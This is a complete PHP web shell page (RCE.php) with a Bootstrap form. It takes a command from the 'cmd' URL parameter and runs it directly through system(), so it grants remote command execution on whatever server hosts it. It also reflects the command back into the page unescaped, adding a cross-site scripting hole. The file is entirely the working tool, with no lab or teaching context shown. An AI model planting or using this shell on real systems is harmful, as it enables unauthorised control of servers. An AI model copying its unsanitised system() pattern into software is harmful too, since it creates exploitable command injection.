<?php

if ( isset($_GET["execute"]) ) {

    /*
    Example of how $_GET stores information in an array:

    Array
    (
        [cmd] => whoami
        [execute] => Execute
    )
    */
    echo "<pre>";
    print_r($_GET);
    echo "</pre>";

    $cmd = $_GET["cmd"];

    // Executes the command.
    system($cmd);
    echo "<hr>";
}

?>

<!doctype html>
<html lang='en'>
<head>
    <meta charset='utf-8'>
    <title>Web Shell</title>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>

    <link rel='stylesheet' href="MyCss.css" type='text/css'>
    
</head>
<body>

<div class="container">
    <div class="col-sm-6"> 

        <h4 class="text">Web Shell</h4><br>

        <form action="RCE.php" method="GET">
            <div class="form-group">
                <label for="Command">Command</label>

                <input type="text" class="form-control" name="cmd" placeholder="whoami" value="<?php echo $cmd; ?>">
            </div>

            <br>
            <input class="btn btn-success" type="submit" name="execute" value="Execute"> 
        </form> 
        
    </div>
</div>


</body>
</html>